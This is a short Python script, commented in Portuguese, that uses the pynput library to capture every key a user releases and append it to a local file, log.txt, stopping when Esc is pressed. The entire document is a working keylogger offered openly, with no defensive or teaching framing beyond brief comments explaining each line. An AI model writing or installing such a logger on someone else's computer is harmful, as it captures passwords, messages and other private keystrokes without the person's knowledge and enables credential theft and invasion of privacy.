from pynput.keyboard import Listener, Key #importa o "modo" do qual grava o que é escrito no teclado

def log(text): #Cria um arquivo .txt que salva o que é escrito no teclado
    with open ("log.txt","a") as file_log:
        file_log.write(text)

def monitor(key):
    try:
        log(key.char) #Passa as teclas usadas para o arquivo log.txt
    except AttributeError:
        log (str(key))
    if key == Key.esc: #o programa fecha quando aperta esc
        return False

with Listener(on_release=monitor) as listener:
    listener.join()
